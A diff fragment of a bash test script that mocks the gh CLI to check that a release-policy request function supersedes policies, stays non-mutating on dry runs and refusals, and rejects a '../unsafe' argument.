+	: >"${TEST_ROOT}/calls"
+	dry=$(release_policy_request owner/app semver '' true true true) || exit 1
+	[[ "$dry" == *'Dry run: would remove persistent'* ]] || exit 1
+	if grep -Eq '^(create |issue-edit )|issue close' "${TEST_ROOT}/calls"; then exit 1; fi
+	: >"${TEST_ROOT}/calls"
+	superseded=$(release_policy_request owner/app semver '' true true) || exit 1
+	[[ "$superseded" == *'SUPERSEDED='* ]] || exit 1
+	grep -q '^gh issue close 50 --repo owner/app --reason not planned' "${TEST_ROOT}/calls"
+	grep -q '^create ' "${TEST_ROOT}/calls"
+	grep -q '^issue-edit 50 ' "${TEST_ROOT}/calls"
+	printf 'PASS --supersede replaces a signed policy; refusal and dry-run are non-mutating\n'
+	: >"${TEST_ROOT}/calls"
+	if release_policy_request owner/app commits '../unsafe' 2>/dev/null; then exit 1; fi
+	if grep -Eq '^(create |issue-edit )' "${TEST_ROOT}/calls"; then exit 1; fi
 	gh() {
 		printf 'gh %s\n' "$*" >>"${TEST_ROOT}/calls"
 		# A non-canonical body that still carries the maintainer command.
